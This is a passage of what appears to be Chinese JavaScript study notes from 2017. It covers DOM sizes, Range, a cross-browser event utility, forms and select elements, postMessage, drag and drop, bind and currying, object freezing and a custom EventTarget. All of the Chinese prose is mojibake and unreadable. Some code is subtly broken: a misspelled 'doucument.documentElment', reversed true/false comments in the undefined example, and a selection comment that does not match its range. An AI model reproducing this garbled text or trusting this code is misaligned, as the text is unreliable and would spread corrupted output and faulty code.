çš„å·¦å†…è¾¹æ¡†ä¹‹é—´çš„åƒç´ è·ç¦»ï¼› offsetTop = å…ƒç´ ä¸Šè¾¹æ¡†è‡³åŒ…å«å…ƒç´ çš„ä¸Šå†…è¾¹æ¡†ä¹‹é—´çš„åƒç´ è·ç¦»ï¼› 123456789101112// æƒ³çŸ¥é“æŸä¸ªå…ƒç´ å†é¡µé¢ä¸Šçš„åç§»é‡function getElementLeft(ele) &#123; var actualLeft = ele.offsetLeft var current = ele.offsetParent while (current !== null) &#123; actualLeft += current.offsetLeft current = current.offsetParent &#125; return actualLeft&#125; å®¢æˆ·åŒºå¤§å° clientWidth = å…ƒç´ å†…å®¹åŒºå®½åº¦ + å·¦å³å†…è¾¹è·å®½åº¦ï¼› clientHeight = å…ƒç´ å†…å®¹åŒºé«˜åº¦ + å·¦å³å†…è¾¹è·é«˜åº¦ï¼› æ»šåŠ¨å¤§å° scrollHeight: åœ¨æ²¡æœ‰æ»šåŠ¨æ¡çš„æƒ…å†µä¸‹ï¼Œå…ƒç´ å†…å®¹çš„æ€»é«˜åº¦ï¼› scrollWidth: åœ¨æ²¡æœ‰æ»šåŠ¨æ¡çš„æƒ…å†µä¸‹ï¼Œå…ƒç´ å†…å®¹çš„æ€»å®½åº¦ï¼› scrollLeft: è¢«éšè—åœ¨å†…å®¹åŒºåŸŸå·¦ä¾§çš„åƒç´ æ•°ã€‚é€šè¿‡è®¾ç½®è¿™ä¸ªå±žæ€§å¯ä»¥æ”¹å˜å…ƒç´ çš„æ»šåŠ¨ä½ç½®ã€‚ scrollTop: è¢«éšè—åœ¨å†…å®¹åŒºåŸŸä¸Šæ–¹çš„åƒç´ æ•°ã€‚é€šè¿‡è®¾ç½®è¿™ä¸ªå±žæ€§å¯ä»¥æ”¹å˜å…ƒç´ çš„æ»šåŠ¨ä½ç½®ã€‚ PSï¼šåœ¨ä¸åŒ…å«æ»šåŠ¨æ¡çš„é¡µé¢è€Œè¨€ï¼ŒscrollWidth ä¸Ž clientWidthï¼ŒscrollHeight ä¸Ž clientHeight çš„å…³ç³»å¹¶ä¸æ˜¯ååˆ†æ¸…æ™°ã€‚ Firefoxï¼Œè¿™ä¸¤ç»„å±žæ€§å§‹ç»ˆç›¸ç­‰ï¼Œä½†å¤§å°ä»£è¡¨çš„æ˜¯æ–‡æ¡£å†…å®¹åŒºåŸŸçš„å®žé™…å°ºå¯¸ï¼Œè€Œéžè§†å£å°ºå¯¸ï¼› Opreaã€safariã€chrome ä¸­è¿™ä¸¤ç»„å±žæ€§æœ‰å·®åˆ«ï¼Œå…¶ä¸­ scrollWidth å’Œ scrollHeight ç­‰äºŽè§†å£å¤§å°ï¼Œè€Œ clientWidth å’Œ clientHeight ç­‰äºŽæ–‡æ¡£åŒºåŸŸå¤§å°ï¼› IEï¼Œè¿™ä¸¤ç»„å±žæ€§ä¸ç›¸ç­‰ï¼ŒscrollHeight å’Œ scrollWidth ç­‰äºŽæ–‡æ¡£å†…å®¹åŒºåŸŸå¤§å°ï¼Œè€Œ clientHeight å’Œ clientWidth ç­‰äºŽè§†å£å¤§å°ï¼› æ‰€ä»¥ï¼Œæˆ‘ä»¬ä¸€èˆ¬é‡‡ç”¨èŽ·å–æœ€å¤§å€¼ï¼Œä¿è¯è·¨æµè§ˆå™¨å‡†ç¡®ï¼š 1var docHeight = Math.max(document.documentElement.scrollHeight, doucument.documentElment.clientHeight); html4.0 çš„ DTD 1&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt; html5 çš„ DTD 1&lt;!DOCTYPE html&gt; åœ¨æ–‡æ¡£ä½¿ç”¨äº† DTD æ—¶ï¼Œdocument.body.scrollHeight å€¼ä¸º 0ï¼Œæ²¡æœ‰ç”¨ DTD æ—¶ä¸ä¸º 0 ç¡®å®šå…ƒç´ å¤§å° getBoundingClientRect()æ–¹æ³•ï¼Œè¿”å›žä¸€ä¸ªå¯¹è±¡ï¼ŒåŒ…æ‹¬å››ä¸ªå±žæ€§ï¼šleftã€topã€right å’Œ bottomã€‚è¿™äº›å±žæ€§ç»™å‡ºäº†å…ƒç´ ç›¸å¯¹è§†å£çš„ä½ç½®ã€‚ â€”â€”2017/11/26 èŒƒå›´ selectNode() é€‰æ‹©æ•´ä¸ªèŠ‚ç‚¹ selectNodeContents() åªé€‰æ‹©èŠ‚ç‚¹çš„å­èŠ‚ç‚¹ html 123&lt;p id='p1'&gt; &lt;b&gt;Hello&lt;/b&gt;World!&lt;/p&gt; js 12345678910var p1 = document.getElementById('p1'), helloNode = p1.firstChild.firstChild, worldNode = p1.lastChild, range = document.createRange()var span = document.createElement('span')span.style.color = 'red'range.selectNode(helloNode) // é€‰æ‹©æ•´ä¸ªèŠ‚ç‚¹range.surroundContents(span) // åŒ…å«é€‰æ‹©çš„èŠ‚ç‚¹ 123456range.deleteContents() // åˆ é™¤èŒƒå›´é€‰åŒºvar fragment = range.extractContents() // ç§»é™¤èŒƒå›´é€‰åŒºï¼Œè¿”å›žæ–‡æ¡£ç‰‡æ®µvar fragment = range.cloneContents() // èµ‹å€¼èŒƒå›´é€‰åŒºspan.appendChild(document.createTextNode('Inserted Text'))range.insertNode(span) // åœ¨é€‰åŒºå‰æ’å…¥ä¸€ä¸ªèŠ‚ç‚¹ äº‹ä»¶ä¸ºäº†å…¼å®¹æ‰€æœ‰æµè§ˆå™¨ï¼Œä¸€èˆ¬å¯¹å…ƒç´ æ·»åŠ ã€åˆ é™¤äº‹ä»¶åšå¦‚ä¸‹å¤„ç†ï¼ˆä¸è¿‡ä¸€èˆ¬ IE9+éƒ½æ²¡æœ‰å¿…è¦è¿™ä¹ˆåšï¼‰ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384var EventUtil = &#123; // æ·»åŠ äº‹ä»¶ addHandler: function (element, type, handler) &#123; if (element.addEventListener) &#123; element.addEventListener(type, handler, false) &#125; else if (element.attachEvent) &#123; element.attachEvent('on' + type, handler) &#125; &#125;, // èŽ·å–äº‹ä»¶å¯¹è±¡ getEvent: function (ev) &#123; return ev ? ev : window.event &#125;, // èŽ·å–äº‹ä»¶ç›®æ ‡ getTarget: function (ev) &#123; return ev.target || ev.srcElement &#125;, // é˜»æ­¢é»˜è®¤äº‹ä»¶ preventDefault: function (ev) &#123; if (ev.preventDefault) &#123; ev.preventDefault() &#125; else &#123; ev.returnValue = false &#125; &#125;, // ç§»é™¤äº‹ä»¶ removeHandler: function (element, type, handler) &#123; if (element.removeEventListener) &#123; element.removeEventListener(type, handler, false) &#125; else if (element.detachEvent) &#123; element.detachEvent('on' + type, handler) &#125; &#125;, // é˜»æ­¢å†’æ³¡ stopPropagation: function (ev) &#123; if (ev.stopPropagation) &#123; ev.stopPropagation() &#125; else &#123; ev.cancelBubble = true &#125; &#125;, // èŽ·å–ç›¸å…³å…ƒç´  getRelatedTarget: function (ev) &#123; if (ev.relatedTarget) &#123; return ev.relatedTarget &#125; else if (ev.toElement) &#123; return ev.toElement &#125; else if (ev.fromElement) &#123; return ev.fromElement &#125; &#125;, // èŽ·å–é¼ æ ‡æ»šåŠ¨ getWheelDelta: function (ev) &#123; // å…¶ä»– å¯¹åº”mousewheeläº‹ä»¶ if (ev.wheelDelta) &#123; return ev.wheelDelta &#125; // å…¼å®¹Firefox å¯¹åº”DOMMouseScroll else &#123; return -ev.detail * 40 &#125; &#125;, // èŽ·å–keypressæŒ‰ä¸‹é”®å­—ç¬¦çš„ASCLLç  getCharCode: function (ev) &#123; if (typeof ev.charCode == 'number') &#123; return ev.charCode &#125; else &#123; return ev.keyCode &#125; &#125;, // èŽ·å–å‰ªè´´æ¿æ•°æ® getClipboardText: function (ev) &#123; var clipboardData = event.clipboardData || window.clipboardData return clipboardData.getData('text') &#125;, // è®¾ç½®å‰ªè´´æ¿æ•°æ® setClipboardText: function (ev, value) &#123; if (ev.clipboardData) &#123; return event.clipboardData.setData('text/plain', value) &#125; else if (window.clipboardData) &#123; return window.clipboardData.setData('text', value) &#125; &#125;&#125; æ‰«ç›²ï¼šä»¥å‰è®¤ä¸ºåœ¨é¡µé¢å¸è½½çš„æ—¶å€™æ²¡æœ‰åŠžæ³•åŽ»æŽ§åˆ¶ï¼Œå½“åˆæ²¡æœ‰æ³¨æ„åˆ° window ä¸‹çš„ beforeunload äº‹ä»¶ 12345EventUtil.addHandler(window, 'beforeunload', function (ev) &#123; var msg = 'before unload?' ev.returnValue = 'before unload?' return 'before unload ?'&#125;) æ–°è®¤è¯†ä¸€ä¸ªäº‹ä»¶ï¼ŒDOMContentLoadedäº‹ä»¶åœ¨å½¢æˆå®Œæ•´çš„ DOM æ•°ä¹‹åŽå°±è§¦å‘ï¼Œä¸ä¼šç†ä¼šå›¾ç‰‡ã€JavaScript æ–‡ä»¶ã€css æ–‡ä»¶æˆ–å…¶ä»–èµ„æºæ˜¯å¦å·²ç»ä¸‹è½½å®Œæ¯•ã€‚ â€”â€” 2017/11/27 è‡ªå®šä¹‰äº‹ä»¶123456789101112131415EventUtil.addHandler(selfBtn, 'myEvent', function (ev) &#123; ev = EventUtil.getEvent(ev) console.log('btn myEvent:', ev.detail)&#125;)EventUtil.addHandler(document, 'myEvent', function (ev) &#123; ev = EventUtil.getEvent(ev) console.log('document myEvent:', ev.detail)&#125;)var event = document.createEvent('CustomEvent')event.initCustomEvent('myEvent', true, false, 'hello my event')selfBtn.dispatchEvent(event) â€”â€” 2017/12/6 è¡¨å•form è¡¨å•ä½œä¸ºä¸€ç§å¤è€çš„æ•°æ®æäº¤æ–¹å¼ï¼Œå¾ˆå¤šç»†èŠ‚è¿˜çœŸæ˜¯å¤´å›žè§ï¼Œä¸‹é¢å°è®°ä¸‹ã€‚ 1234567891011121314&lt;form action="http://xxx.com" method="post" id="form1"&gt; &lt;p&gt; &lt;label&gt;å§“åï¼š&lt;/label&gt; &lt;input type="text" value="" id="username"&gt; &lt;/p&gt; &lt;p&gt; &lt;label&gt;æ€§åˆ«ï¼š&lt;/label&gt; &lt;input type="text" value="" id="username"&gt; &lt;select name="gender"&gt; &lt;option value="0"&gt;ç”·&lt;/option&gt; &lt;option value="1"&gt;å¥³&lt;/option&gt; &lt;/select&gt; &lt;/p&gt;&lt;/form&gt; 123var forms = document.forms // èŽ·å–é¡µé¢ä¸­æ‰€æœ‰formé›†åˆvar firstForm = document.forms[0]; // ç´¢å¼•èŽ·å–è¡¨å•var form1 = document.forms["form1"]; // æ ¹æ®åç§°èŽ·å–è¡¨å• å•å‡»ä¸€ä¸‹ä»£ç ç”Ÿæˆçš„æŒ‰é’®ï¼Œå¯ä»¥æäº¤è¡¨å• 123&lt;input type="submit" value="Submit form"&gt;&lt;button type="submit" &gt;Submit form&lt;/button&gt;&lt;input type="image" src="demo.png"&gt; è¿™ç§æ–¹å¼æäº¤è¡¨å•ï¼Œæµè§ˆå™¨ä¼šå°†è¯·æ±‚å‘é€åˆ°æœåŠ¡å™¨ä¹‹å‰è§¦å‘ submit äº‹ä»¶ã€‚ 123var form = document.querySelector("form");var firstField = form.elements[0];var field1 = form.elements["name"]; é™¤äº†å…ƒç´ å¤–ï¼Œæ‰€æœ‰è¡¨å•å­—æ®µæ‹¥æœ‰ç›¸åŒçš„ä¸€ç»„å±žæ€§ï¼šdisabledã€formã€nameã€readonlyã€tabIndexã€typeã€valueã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå¯¹ value å±žæ€§æ‰€åšçš„ä¿®æ”¹ï¼Œä¸ä¸€å®šä¼šåæ˜ åœ¨ DOM ä¸­ï¼Œå› æ­¤ï¼Œåœ¨å¤„ç†æ–‡æœ¬æ¡†çš„å€¼æ—¶ï¼Œæœ€å¥½ä¸è¦ä½¿ç”¨ DOM æ–¹æ³•ã€‚ ä¸ºè§£å†³ä¸çŸ¥é“ç”¨æˆ·é€‰æ‹©äº†ä»€ä¹ˆæ–‡æœ¬çš„å›°æ‰°ï¼Œæ–°è®¤è¯†äº†ä¸¤ä¸ªå±žæ€§ï¼šselectionStartã€selectionEndã€‚ 12345678$name.addEventListener("select", function(ev) &#123; if(typeof $name.selectionStart == "number") &#123; console.log($name.value.substring($name.selectionStart, $name.selectionEnd)); &#125; else if(document.selection) &#123; // IE8- console.log(document.selection.createRange().text); &#125;&#125;); è®¾ç½®é€‰ä¸­éƒ¨åˆ†æ–‡æœ¬è§£å†³æ–¹æ¡ˆï¼šsetSelectionRange 123$name.value = "hello form";$name.setSelectionRange(0, 4); // hel$name.focus(); å¤åˆ¶&amp;&amp;ç²˜è´´é—®é¢˜è§£å†³æ–¹æ¡ˆï¼ševent.clipboardData/window.clipboardData èŽ·å–åˆ° clipboardData å¯¹è±¡ï¼Œæœ‰ setData å’Œ getData æ–¹æ³•ã€‚åªæœ‰ opera ä¸æ”¯æŒã€‚Firefoxã€safari å’Œ chrome åªå…è®¸åœ¨ paste äº‹ä»¶å‘ç”Ÿæ—¶è¯»å–å‰ªè´´æ¿æ•°æ®ï¼Œè€Œ ie æ²¡æœ‰è¿™ä¸ªé™åˆ¶ã€‚ ä»¥å‰å¯¹ select çš„æ“ä½œè¿‡äºŽä¾èµ– jQuery æˆ–è€… DOM æ“ä½œï¼Œå…¶å®žæœ¬èº«æœ‰äº›å¾ˆå¥½çš„æ–¹æ³•å’Œå±žæ€§ã€‚HTMLSelectElement æä¾›çš„ä¸€äº›å±žæ€§å’Œæ–¹æ³•ï¼š add(newOption, relOption)ï¼šå‘æŽ§ä»¶ä¸­æ’å…¥æ–°å…ƒç´ ï¼Œå…¶ä½ç½®åœ¨ç›¸å…³é¡¹ relOption ä¹‹å‰ã€‚ multipleï¼šæ˜¯å¦å…è®¸å¤šé¡¹é€‰æ‹©ã€‚ optionsï¼šæŽ§ä»¶ä¸­æ‰€æœ‰å…ƒç´ çš„ HTMLCollectionã€‚ remove(index)ï¼šç§»é™¤ç»™å®šä½ç½®çš„é€‰é¡¹ã€‚ selectedIndexï¼šåŸºäºŽ 0 çš„é€‰ä¸­é¡¹ç´¢å¼•ï¼Œæ²¡æœ‰é€‰ä¸­é¡¹ï¼Œè¿”å›ž-1.å¯¹äºŽå¤šé€‰é¡¹ï¼Œåªè¿”å›žé€‰ä¸­é¡¹ä¸­çš„ç¬¬ä¸€é¡¹ç´¢å¼•ã€‚ sizeï¼šé€‰æ‹©æ¡†ä¸­å¯è§è¡Œæ•°ã€‚ HTMLOptionElement æœ‰ä¸€ä¸‹å±žæ€§ï¼š indexï¼šå½“å‰é€‰é¡¹åœ¨ options é›†åˆä¸­çš„ç´¢å¼•ã€‚ labelï¼šå½“å‰é€‰é¡¹çš„æ ‡ç­¾ã€‚ selectedï¼šå½“å‰é€‰é¡¹æ˜¯å¦è¢«é€‰ä¸­ã€‚å°†è¿™ä¸ªå±žæ€§è®¾ç½®ä½ true å¯ä»¥é€‰ä¸­å½“å‰é€‰é¡¹ã€‚ textï¼šé€‰é¡¹çš„æ–‡æœ¬ã€‚ valueï¼šé€‰é¡¹çš„å€¼ã€‚ 1234567&lt;select name="is-student" id="is-student"&gt; &lt;option value="0"&gt;å¦&lt;/option&gt; &lt;option value="1"&gt;æ˜¯&lt;/option&gt; &lt;option value="2"&gt;ä¸æ¸…æ¥š&lt;/option&gt; &lt;option value="3"&gt;ä¸æ˜Žç™½&lt;/option&gt; &lt;option value="4"&gt;ä¸çŸ¥é“&lt;/option&gt;&lt;/select&gt; 123456789101112131415options = $isStudent.options;// å°†ç¬¬å››ä½ç½®ä¸Šçš„optionå…ƒç´ æ’å…¥åˆ°ç¬¬äºŒä½å‰é¢$isStudent.add(options[3], options[1]);// ç§»é™¤ç¬¬äº”ä½optionå…ƒç´ $isStudent.remove(4);// å°†ç¬¬ä¸‰é¡¹é€‰ä¸­options[2].selected = true;console.log("é€‰ä¸­äº†çš„é¡¹ç´¢å¼•ï¼š", $isStudent.selectedIndex); // 2console.log("é€‰ä¸­é¡¹çš„æ–‡æœ¬ï¼š", options[$isStudent.selectedIndex].text); // æ˜¯console.log("é€‰ä¸­é¡¹çš„æ ‡ç­¾ï¼š", options[$isStudent.selectedIndex].label); // æ˜¯console.log("é€‰ä¸­é¡¹çš„åœ¨optionsé›†åˆä¸­çš„ç´¢å¼•ï¼š", options[$isStudent.selectedIndex].index); // 2 â€”â€” 2017/12/8 typeof undefinedä»¥å‰æ€»è¿·æƒ‘ï¼Œä¸ºå˜›èƒ½å¤Ÿç›´æŽ¥ 1if(aaa === undefined) çœ‹åˆ°åˆ«äººåå 1if(typeof aaa == "undefined") ä»Šå¤©æ‰æ˜Žç™½å…¶ä¸­é“ç†ï¼šå› ä¸ºåœ¨ js ä¸­ undefined å¯ä»¥è¢«é‡å†™ï¼Œè¿™æ ·é˜²æ­¢é¡µé¢ä¸­æœ‰ undefined å˜é‡å­˜åœ¨ã€‚ä¸‹é¢æ¥çœ‹çœ‹åŒºåˆ«ï¼š 12345678910;(function (undefined) &#123; var a console.log('test1: ', a === undefined) // false console.log('test1: ', 'abc' === undefined) // true&#125;)('abc');(function (undefined) &#123; // var a; console.log('test2: ', typeof a === 'undefined') // true console.log('test2: ', 'abc' === undefined) // true&#125;)('abc') ä½œç”¨äºŽå®‰å…¨æž„é€ å‡½æ•°æž„é€ å‡½æ•°å…¶å®žæ˜¯ä¸€ä¸ªä½¿ç”¨ new æ“ä½œç¬¦è°ƒç”¨çš„å‡½æ•°ã€‚å½“ä½¿ç”¨ new è°ƒç”¨æ—¶ï¼Œæž„é€ å‡½æ•°å†…ç”¨åˆ°çš„ this å¯¹è±¡ä¼šæŒ‡å‘æ–°åˆ›å»ºçš„å¯¹è±¡å®žä¾‹ã€‚ 12345678function Person(name, age) &#123; this.name = name this.age = age&#125;var person = new Person('wuwh', '22')console.log(person.name)console.log(person.age) å¦‚æžœæž„é€ å‡½æ•°è¢«å½“ä½œæ™®é€šå‡½æ•°è°ƒç”¨ï¼Œthis å°±ä¼šæŒ‡å‘ window å¯¹è±¡ï¼Œæ·»åŠ æˆ window ä¸‹çš„å±žæ€§ã€‚ 123var person = Person('wuwh', '22')console.log(window.name)console.log(window.age) è§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ³•æ—¶åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸå®‰å…¨çš„æž„é€ å‡½æ•°ï¼ŒåŽŸç†æ˜¯åœ¨è¿›è¡Œä»»ä½•æ›´æ”¹å‰ï¼Œç¡®è®¤ this å¯¹è±¡æ˜¯æŒ‡å‘æ­£ç¡®çš„å®žä¾‹ã€‚ 12345678function Person(name, age) &#123; if (this instanceof Person) &#123; this.name = name this.age = age &#125; else &#123; return new Person(name, age) &#125;&#125; â€”â€” 2017/12/9 HTML5 åŽŸç”Ÿ APIXDM è·¨æ–‡æ¡£æ¶ˆæ¯ä¼ é€ï¼ˆXDMï¼‰,HTML5 åŽŸç”Ÿæä¾›äº† postMessage æ–¹æ³•ã€‚ postMessage()æ–¹æ³•æŽ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼š ä¸€æ¡æ¶ˆæ¯ ä¸€ä¸ªè¡¨ç¤ºæ¶ˆæ¯æŽ¥æ”¶æ–¹æ¥è‡ªå“ªä¸ªåŸŸä¸‹çš„å­—ç¬¦ä¸² 1234var frameWindow = document.querySelector('iframe').contentWindowsetTimeout(function () &#123; frameWindow.postMessage('hello', 'http://localhost')&#125;, 1000) æŽ¥æ”¶åˆ° XDM æ¶ˆæ¯æ—¶ï¼Œä¼šè§¦å‘ window å¯¹è±¡çš„ message äº‹ä»¶ï¼Œæ”¹äº‹ä»¶ä¼šåŒ…å«ä¸‰ä¸ªé‡è¦ä¿¡æ¯ï¼š dataï¼špostMessage()ç¬¬ä¸€ä¸ªå‚æ•°ï¼› originï¼šå‘é€æ¶ˆæ¯çš„æ–‡æ¡£æ‰€åœ¨çš„åŸŸï¼› sourceï¼šå‘é€æ¶ˆæ¯çš„æ–‡æ¡£ window å¯¹è±¡çš„ä»£ç†ï¼Œç”¨äºŽå‘é€ä¸Šä¸€æ¡æ¶ˆæ¯çš„çª—å£ä¸­è°ƒç”¨ postMessage()ã€‚ 1234567// æŽ¥æ”¶XDMæ¶ˆæ¯window.addEventListener('message', function (ev) &#123; console.log('ev.origin:', ev.origin) console.log('ev.data:', ev.data) console.log('ev.source:', ev.source) ev.source.postMessage('Received!', 'http://localhost')&#125;) æ‹–æ”¾äº‹ä»¶ åœ¨è¢«æ‹–åŠ¨å…ƒç´ ä¸Šä¾æ¬¡è§¦å‘äº‹ä»¶ï¼š dragstart drag dragend åœ¨é˜²æ­¢ç›®æ ‡ä¸Šä¾æ¬¡è§¦å‘äº‹ä»¶ï¼š dragenter dragover dragleave dropä¸ºäº†é˜»æ­¢é»˜è®¤è¡Œä¸ºï¼Œä¸€èˆ¬éƒ½è¦å¯¹ dragenterã€dragover å’Œ drop ç»‘å®šé˜»æ­¢é»˜è®¤äº‹ä»¶ã€‚ è®¤è¯†ä¸€ä¸ªæ–°çš„äº‹ä»¶å±žæ€§ dataTransferï¼Œç”¨äºŽä»Žè¢«æ‹–æ”¾å…ƒç´ å‘æ”¾ç½®ç›®æ ‡ä¼ é€’å­—ç¬¦ä¸²æ ¼å¼çš„æ•°æ®ã€‚ 123456789// è®¾ç½®æ–‡æœ¬å’Œurlæ•°æ®ev.dataTransfer.setData('URL', location.href)ev.dataTransfer.setData('text', 'hello drag')// æŽ¥æ”¶æ–‡æœ¬å’Œurlæ•°æ®console.log('dataTransfer url:', dataTransfer.getData('URL') || dataTransfer.getData('text/uri-list'))console.log('dataTransfer text:', dataTransfer.getData('text'))console.log('dataTransfer file:', dataTransfer.file) â€”â€” 2017/12/9 é«˜çº§å‡½æ•°æƒ°æ€§è½½å…¥å‡½æ•° æœ‰æ—¶å€™å¯¹æµè§ˆå™¨çš„æ£€æµ‹ï¼Œæˆ‘ä»¬æ‰§è¡Œä¸€æ¬¡å°±è¡Œï¼Œä¸å¿…æ¯æ¬¡è°ƒç”¨è¿›è¡Œåˆ†æ”¯æ£€æµ‹ã€‚è§£å†³æ–¹æ¡ˆå°±æ˜¯æƒ°æ€§è½½å…¥ã€‚ åœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨è¿‡ç¨‹ä¸­ï¼Œè¯¥å‡½æ•°è¢«è¦†ç›–ä¸ºå¦ä¸€ä¸ªåˆé€‚æ–¹å¼æ‰§è¡Œçš„å‡½ã€‚ 12345678910111213function createXHR() &#123; if (typeof XMLHttpRequest != 'undefined') &#123; createXHR = function () &#123; return new XMLHttpRequest() &#125; &#125; else if (typeof ActiveXObject != 'undefined') &#123; createXHR = function () &#123; return new ActiveXObject('MSXML2.XMLHTTP') &#125; &#125; return createXHR()&#125; å‡½æ•°å£°æ˜Žæ—¶å°±è‡ªæ‰§è¡ŒæŒ‡å®šæ°å½“çš„å‡½æ•°ã€‚ 12345678910111213var createXHR = (function () &#123; if (typeof XMLHttpRequest != 'undefined') &#123; createXHR = function () &#123; return new XMLHttpRequest() &#125; &#125; else if (typeof ActiveXObject != 'undefined') &#123; createXHR = function () &#123; return new ActiveXObject('MSXML2.XMLHTTP') &#125; &#125; return createXHR()&#125;)() å‡½æ•°ç»‘å®š æŒ‡å®šä¸€ä¸ªå‡½æ•°å†… this çŽ¯å¢ƒï¼ŒES5 åŽŸç”Ÿå¯ä»¥ç”¨ bindï¼Œbind å®žçŽ°åŽŸç†æ—¶è¿™æ ·çš„ï¼š 12345function bind(fn, context) &#123; return function () &#123; fn.apply(context, arguments) &#125;&#125; bind ä¸€èˆ¬ç”¨äºŽäº‹ä»¶å¤„ç†ç¨‹åºä»¥åŠ setTimeout()å’Œ setInterval()ã€‚å› ä¸ºè¿™äº›ç›´æŽ¥ç”¨å‡½æ•°åï¼Œå‡½æ•°ä½“å†… this æ—¶åˆ†åˆ«æŒ‡å‘å…ƒç´ å’Œ window çš„ã€‚ å‡½æ•°æŸ¯é‡ŒåŒ– ä¸Šé¢æ¨¡æ‹Ÿç»‘å®šå‡½æ•°çš„å®žçŽ°ï¼Œå‘çŽ°ä¸èƒ½ä¼ å‚ã€‚äºŽæ˜¯ï¼Œå¯¹ç»‘å®šå‡½æ•°è¿›è¡Œä¼ å‚å¤„ç†å«åšå‡½æ•°æŸ¯é‡ŒåŒ–ã€‚ å®žçŽ°å¯ä»¥ä¼ å‚çš„ bind å‡½æ•°ã€‚ 12345678function bind(fn, context) &#123; var args = Array.prototype.slice.call(arguments) return function () &#123; var innerArgs = Array.prototype.slice.call(arguments) var finalArgs = args.concat(innerArgs) return fn.apply(context, finalArgs) &#125;&#125; é˜²æ­¢ç¯¡æ”¹å¯¹è±¡ Object.preventExtensions() é˜²æ­¢ç»™å¯¹è±¡æ·»åŠ æ–°å±žæ€§å’Œæ–¹æ³•ã€‚ 123456var person = &#123; name: 'wuwh'&#125;Object.preventExtensions(person)person.age = 22console.log(person.age) // undefined Object.seal() é˜²æ­¢åˆ é™¤å¯¹è±¡å±žæ€§å’Œæ–¹æ³•ã€‚ 123456var person = &#123; name: 'wuwh'&#125;Object.seal(person)delete person.nameconsole.log(person.name) // wuwh Object.freeze() å†»ç»“å¯¹è±¡ï¼Œæ—¢ä¸å¯ä»¥æ‹“å±•ï¼Œä¹Ÿä¸å¯ä»¥å¯†å°ï¼Œè¿˜ä¸å¯ä»¥ä¿®æ”¹ã€‚ 12345678910var person = &#123; name: 'wuwh'&#125;Object.freeze(person)person.age = 22console.log(person.age) // undefineddelete person.nameconsole.log(person.name) // wuwhperson.name = 'xiohua'console.log(person.name) // wuwh å®šæ—¶å™¨ ç†è§£è¿™æ®µè¯å°±æ˜Žç™½ä¸ºä»€ä¹ˆ setInterval è¦è°¨æ…Žä½¿ç”¨äº†ã€‚ ä½¿ç”¨ setInterval()åˆ›å»ºçš„å®šæ—¶å™¨ç¡®ä¿äº†å®šæ—¶å™¨ä»£ç è§„åˆ™åœ°æ’å…¥åˆ°é˜Ÿåˆ—ä¸­ã€‚é—®é¢˜åœ¨äºŽï¼Œå®šæ—¶å™¨ä»£ç å¯èƒ½åœ¨è¢«æ·»åŠ åˆ°é˜Ÿåˆ—ä¹‹å‰è¿˜æ²¡æœ‰å®Œæˆæ‰§è¡Œï¼Œç»“æžœå¯¼è‡´å®šæ—¶å™¨ä»£ç è¿è¡Œå¥½å‡ æ¬¡ï¼Œè€Œä¹‹é—´æ²¡æœ‰åœé¡¿ã€‚åœ¨è¿™é‡Œ js å¼•æ“Žé¿å…äº†è¿™ä¸ªé—®é¢˜ã€‚å½“æ—¶ç”¨ setInterval()æ—¶ï¼Œä»…å½“æ²¡æœ‰è¯¥å®šæ—¶å™¨çš„ä»»ä½•å…¶ä»–ä»£ç å®žä¾‹æ—¶ï¼Œæ‰å°†å®šæ—¶å™¨ä»£ç æ·»åŠ åˆ°é˜Ÿåˆ—ä¸­ã€‚ç¡®ä¿äº†å®šæ—¶å™¨ä»£ç åŠ å…¥åˆ°é˜Ÿåˆ—åœ°æœ€å°æ—¶é—´é—´éš”ä¸ºæŒ‡å®šé—´éš”ã€‚ é€ æˆåŽæžœï¼š(1)æŸäº›é—´éš”è¢«è·³è¿‡ï¼›(2)å¤šä¸ªå®šæ—¶å™¨åœ°ä»£ç æ‰§è¡Œä¹‹é—´åœ°é—´éš”å¯èƒ½ä¼šæ¯”é¢„æœŸåœ°å°ã€‚ â€”â€” 2017/12/13 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129/**è‡ªå®šä¹‰äº‹ä»¶åŸºäºŽè§‚å¯Ÿè€…è®¾è®¡æ¨¡å¼* handlers = &#123;* type1: [eventFn1_1, event1_2, ...],* type2: [eventFn2_1, event2_2, ...]*&#125;*/function EventTarget() &#123; this.handlers = &#123;&#125;;&#125;EventTarget.prototype = &#123; constructor: EventTarget, // æ·»åŠ ä¸€ä¸ªè‡ªå®šä¹‰äº‹ä»¶ addHandler: function(type, handler) &#123; if(typeof this.handlers[type] == &quot;undefined&quot;) &#123; this.handlers[type] = []; &#125; this.handlers[type].push(handler); &#125;, // éåŽ†æ‰§è¡Œè‡ªå®šä¹‰äº‹ä»¶ç¨‹åº fire: function(ev) &#123; if(!ev.target) &#123; ev.target = this; &#125; if(this.handlers[ev.type] instanceof Array) &#123; var handlers = this.handlers[ev.type]; for(var i = 0, len = handlers.length; i &lt; len; i++) &#123; handlers[i](ev); &#125; &#125; &#125;, // ç§»é™¤ä¸€ä¸ªè‡ªå®šä¹‰äº‹ä»¶ç¨‹åº removeHandler: function(type, handler) &#123; if(this.handlers[type] instanceof Array) &#123; var handlers = this.handlers[type]; for(var i = 0, len = handlers.length; i &lt; len; i++) &#123; if(handlers[i] === handler) &#123; handlers.splice(i, 1); break; &#125; &#125; &#125; &#125;&#125;var DragDrop = function (selector) &#123; var dragdrop = new EventTarget(); var draging = null, diffX = 0, diffY = 0; var target = document.querySelector(selector); function handleEvent(ev) &#123; switch (ev.type) &#123; case &quot;mousedown&quot;: draging = target; diffX = ev.clientX - draging.offsetLeft; diffY = ev.clientY - draging.offsetTop; // è§¦å‘è‡ªå®šä¹‰äº‹ä»¶ dragdrop.fire(&#123; type: &quot;dragstart&quot;, target: draging, x: ev.clientX, y: ev.clientY &#125;); break; case &quot;mousemove&quot;: if (draging !== null) &#123; draging.style.left = (ev.clientX - diffX) + &quot;px&quot;; draging.style.top = (ev.clientY - diffY) + &quot;px&quot;; &#125; // è§¦å‘è‡ªå®šä¹‰äº‹ä»¶ dragdrop.fire(&#123; type: &quot;drag&quot;, target: draging, x: 